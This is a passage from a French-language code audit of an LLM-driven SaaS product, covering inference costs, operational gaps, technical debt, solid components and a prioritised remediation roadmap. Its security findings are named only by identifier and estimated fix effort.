| Segment | Clients | Usage/mois | Coût LLM/unité | Total |
|---|---|---|---|---|
| Free | 8 000 | chat seul (Haiku/Sonnet court) | ≈ $0,5 | ≈ $4 k |
| Pro | 1 700 | 2 SDS | ≈ $40 | ≈ $68 k |
| Team | 300 | 2 SDS + 1 BUILD | ≈ $90 | ≈ $27 k |
| **Total inférence** | | | | **≈ $99 k/mois** |

Revenus correspondants : 1 700 × 79 € + 300 × 1 490 € ≈ 581 k€. **L'inférence représente ~17 % du revenu brut — le modèle tient, mais la variance est entièrement dans les boucles de retry** : si Elena échoue 3× sur la moitié des builds, le poste passe à ~25 % et la marge Team se dégrade nettement. Deux décisions à prendre maintenant : borner le coût par build (BudgetService a déjà `DEFAULT_EXECUTION_LIMIT_USD=30` — il est contourné par TIER-02, le brancher est donc aussi un correctif business), et mesurer le coût réel par exécution dès le premier mois (la donnée existe dans `llm_interactions`, elle n'est jamais agrégée).

---

## 6. Ce qui manque pour être exploitable

### OPS-01 — /health ne prouve rien
- **Gravité : bloquant (pour un lancement — vous ne saurez pas que vous êtes en panne)**
- `backend/app/main.py:≈215` (`{"status": "healthy"}` sans toucher DB/Redis/Chroma). `/workers/health` existe et teste Redis (bien).
- **Correctif** : health profond — `SELECT 1`, `redis.ping`, `chroma.count` — avec 503 si l'un échoue ; garder le shallow pour le LB.
- **Effort : 2 h.**

### OPS-02 — Zéro métrique, zéro alerting d'erreur
- **Gravité : majeur**
- Aucun export Prometheus, aucun Sentry. `usage_log` du routeur LLM est en mémoire et perdu au redémarrage. Les coûts LLM sont en base (`llm_interactions`) mais jamais agrégés nulle part — vous ne saurez pas ce que coûte un SDS réel avant la première facture.
- **Correctif** : Sentry SDK (30 min), endpoint `/metrics` (prometheus-client) pour requêtes/latence/erreurs/jobs ARQ, et une vue SQL d'agrégation des coûts par exécution.
- **Effort : 8 h.**

### OPS-03 — La suite de tests est rouge et personne ne le sait
- **Gravité : majeur**
- `backend/tests/conftest.py` est inutilisable pour les modèles JSONB (test_credit_service.py le contourne et le dit) ; `test_credit_service.py:≈100` assert `resolve_credit_tier(...) == "pro"` alors que le code mappe `"premium" → "team"` — **ce test échoue tel quel** ; `test_full_flow.py:≈120` importe `PMOrchestratorService` qui n'existe plus (renommé V2). Une suite rouge qui n'alerte pas = pas de suite.
- **Correctif** : réparer ces deux fichiers, lancer la suite en CI, refuser de merger sur rouge. PROD-01 serait resté invisible exactement pour cette raison.
- **Effort : 6 h.**

### OPS-04 — Reprise après erreur : bonne base, deux trous
- **Gravité : mineur**
- La state machine avec checkpoints + historique est bien conçue (execution_state.py). Trous : le nettoyage zombie (PROD-04A) et l'absence de reprise cross-worker pour BUILD (registre en mémoire).
- **Effort : inclus dans PROD-04 / vague 3.**

### OPS-05 — Rétention RGPD annoncée, non implémentée
- **Gravité : majeur (conformité)**
- `chat_log.py` promet une suppression à 90 jours "cron job to add" — le job n'existe pas. Les conversations des visiteurs (avec emails collectés) s'accumulent indéfiniment.
- **Correctif** : tâche ARQ quotidienne `DELETE FROM chat_logs WHERE created_at < now() - interval '90 days'` ; documenter dans la politique.
- **Effort : 2 h.**

---

## 7. Dette technique qui coûtera cher

### DEBT-01 — Le god controller a migré dans le service
- **Gravité : majeur**
- `backend/app/services/pm_orchestrator_service_v2.py` (~2 000 lignes : workflow, checkpoints, BRs, UCs, SDS, build prep, CR regen, metadata SF). P4 a déplacé la masse sans la découper. Conséquence concrète : chaque correctif de la vague 1–2 touchera ce fichier, et les agents de développement en parallèle y feront des conflits de merge.
- **Correctif** : pas de refonte avant le lancement — mais geler la forme : plus aucun ajout de méthode après le 1er octobre, extraire au fil de l'eau (BuildPhaseService est le modèle à suivre).
- **Effort : continu, 4 h/sprint.**

### DEBT-02 — Trois sources de prix, deux listes d'agents, deux pistes de migration
- **Gravité : mineur**
- Prix : `cost_calculator.py` (tarifs OpenAI 2024, obsolète) vs `budget_service.MODEL_PRICING` vs `credit_service` (table). Agents : `constants.ts` ≠ `types/constants.ts` ≠ `agents_registry.yaml` (la vraie source). Migrations : `backend/migrations/*.sql` en double d'Alembic.
- **Correctif** : supprimer cost_calculator, supprimer l'un des deux constants.ts, marquer les .sql legacy. Une heure chacun, faites-le avant que quelqu'un ne se réfère à la mauvaise source en production.
- **Effort : 3 h.**

### DEBT-03 — Les overrides d'agents recréent le risque que BaseAgent devait tuer
- **Gravité : mineur**
- Chaque agent ré-implante `_call_llm`/`_log_interaction` avec des comportements divergents (PROD-03 en est le fruit). BaseAgent a le contrat, personne ne l'utilise vraiment.
- **Correctif** : converger les 4 agents sans garde vers l'implémentation de base (qui existe et est correcte) lors de la vague 2.
- **Effort : 4 h.**

### DEBT-04 — Frontend : services legacy doubles
- **Gravité : mineur**
- `frontend/src/services/deliverableService.js`, `projectsService.js`, `qualityGateService.js` appellent des routes en lisant `response.data` alors que `api.get` retourne déjà le JSON — bugs latents à la première utilisation. Pages `pm/*` non routées mais compilées.
- **Correctif** : supprimer les trois services .js et les pages pm/ non routées (ou les router, mais tranchez).
- **Effort : 2 h.**

---

## Ce qui tient — n'y touchez pas

- **Le garde-fou anti-production** (`sf_admin_service.py`, GARDE-PROD-001) : liste blanche de non-production, refus dans le doute. C'est le meilleur morceau de code défensif du dépôt.
- **La state machine d'exécution** (`execution_state.py`) : transitions validées, FOR UPDATE, historique, mapping legacy. Solide.
- **Le JSON cleaner LIFO** (`json_cleaner.py`) : la récupération de JSON tronqué est réellement bien faite.
- **Le flux signup verify-then-create** avec anti-énumération et password hashé dans le token.
- **Le middleware d'enforcement par profil de déploiement** (build_enabled.py) : le mécanisme est bon — il lui manque juste son jumeau par tier.
- **Le retry LLM sur réponse vide avec échec net** (DevOpsAgent FIX-EMPTY-001) : exactement le bon réflexe, à généraliser.
- **La validation structurale pré-LLM d'Elena** et le fail-closed quand la review plante.
- **Le logging JSON avec contextvars** et la probe RAG au boot (P5, P11 réellement corrigés).

---

## Feuille de route

### Vague 1 — avant le 1er octobre (bloquants) — ≈ 50 h d'arbitrage humain

| # | Constat | Effort | Risque évité / effort |
|---|---|---|---|
| 1 | PROD-01 (BA single-batch) | 1 h | **Maximal** — 50 % des SDS incomplets pour 1 ligne |
| 2 | SEC-02 (injection commande) | 1 h | Prise du serveur pour 10 lignes |
| 3 | SEC-03 (traversée ×2) | 3 h | Lecture/écriture serveur |
| 4 | TIER-01 (enforcement paliers) | 6 h | Le modèle économique entier |
| 5 | SEC-01 (auth sur 8 routeurs) | 12 h | Cloisonnement client contractuel |
| 6 | SEC-05 (secret DB ×5) + rotation | 3 h | Compromission dépôt = compromission base |
| 7 | SEC-04 (token Git dans logs) | 2 h | Tokens clients chez le tiers de logs |
| 8 | PROD-02 (WS fuite DB) | 4 h | Pool DB mort au 40e onglet |
| 9 | TIER-02 (credits bypass) | 4 h | Facture LLM non bornée |
| 10 | COH-01 (tools/build_sds) | 3 h | Phase 5 morte — à vérifier en premier sur le serveur |
| 11 | PROD-10 (secrets SF deux chemins) | 4 h | Connexions clients cassées + secrets en clair |
| 12 | PROD-05 (create_all) | 4 h | Premier incident de migration |
| 13 | OPS-01 (health profond) | 2 h | Pilotage à l'aveugle le jour J |
| 14 | PROD-03 (4 agents None) | 3 h | Bombes latentes à l'import |
| 15 | COH-05 (sel IP) + SEC-09 (leads) | 3 h | RGPD + spam |

### Vague 2 — 30 jours

PROD-04 (workers), PROD-06 (CR async), PROD-07 (singleton), PROD-08 (timeout stream), PROD-09 (succès vide), SEC-06 (clé dédiée + script rotation — clôt P8), SEC-07 (tokens hors URL), SEC-08 (CSV), P2 résiduel (chemins durs), P6 (fallbacks d'agents retirés), P12 (le second .env supprimé), OPS-02 (métriques+Sentry+coûts), OPS-03 (tests verts en CI), OPS-05 (rétention RGPD), 429/retry LLM, TIER-03 (limites de volume), COH-03 (prix source unique). ≈ 60 h.

### Vague 3 — ensuite

Stockage objet + reprise build cross-worker (prérequis 100 clients), Chroma→pgvector, data-layer async (prérequis 1 000), DEBT-01 à 04, consolidation routeur LLM multi-instance, pages/services legacy. Cadrer le chantier état-d'exécution-worker dès que le palier 100 est en vue — c'est le seul point de la liste qui prend des semaines, pas des heures.

---

*Limites de cet audit, dites plutôt qu'affirmées : je n'ai pas pu exécuter la suite de tests ni vérifier le serveur — l'existence de `tools/build_sds.py` en production (COH-01) et la conf Nginx (rate limiting, proxy headers) sont les deux points à confirmer par un accès machine avant la vague 1. La numérotation des lignes est estimée sur le paquet fourni (sans numéros de lignes) ; chaque constat cite la fonction pour retrouver l'emplacement sans ambiguïté.*